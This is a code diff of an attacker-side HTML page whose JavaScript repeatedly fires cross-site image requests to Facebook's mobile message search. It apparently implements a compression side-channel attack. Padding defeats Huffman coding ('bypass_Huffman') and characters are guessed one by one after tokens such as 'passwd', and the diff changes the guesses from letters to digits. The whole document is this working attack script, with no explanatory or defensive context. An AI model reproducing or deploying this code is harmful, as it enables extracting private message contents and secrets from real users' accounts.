@@ -1,16 +1,15 @@
 <html>
-<head>
-</head>
 <body>
 <script>
-
-var alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
+var letter_alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
+var num_alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
 var pref;
 var ref;
-var ch = "a";
+var alpha = num_alphabet;
+var ch = alpha[0];
 var j = 0;
 
-function bypass_Huffman(ch) {
+function get_alpha(ch, alphabet) {
 	for (i=0; i< alphabet.length; i++) {
 		if (alphabet[i] != ch) {
 			pref = pref + alphabet[i] + '_';
@@ -19,20 +18,21 @@ function bypass_Huffman(ch) {
 }
 
 function makeRequest() {
-	if (ch > "z") {
-		ch = "a";
-	        j++;
-			console.log("Making Request %d", j);
-        }
-	pref = "potrynmkwi_";
-	bypass_Huffman(ch);
-	ref = "ghos";
-	tail = "znsd";
+	if (ch > alpha[alpha.length - 1]) {
+		ch = alpha[0];
+		j++;
+	}
+	pref = "rynmkwi!";
+	get_alpha(ch, alpha);
+	ref = "passwd";
+	post_ref = "znq";
 	var img = new Image();
-	img.src= "http://touch.facebook.com/messages/?q=" + pref + ref + ch + tail;
+	img.src= "https://touch.facebook.com/messages/?q=" + pref + ref + ch + post_ref;
 	ch = String.fromCharCode(ch.charCodeAt(0) + 1);
+		
+	console.log("making request %d", j);
 
-	setTimeout(makeRequest, 500);
+	setTimeout(makeRequest, 2000);
 }
 
 makeRequest();
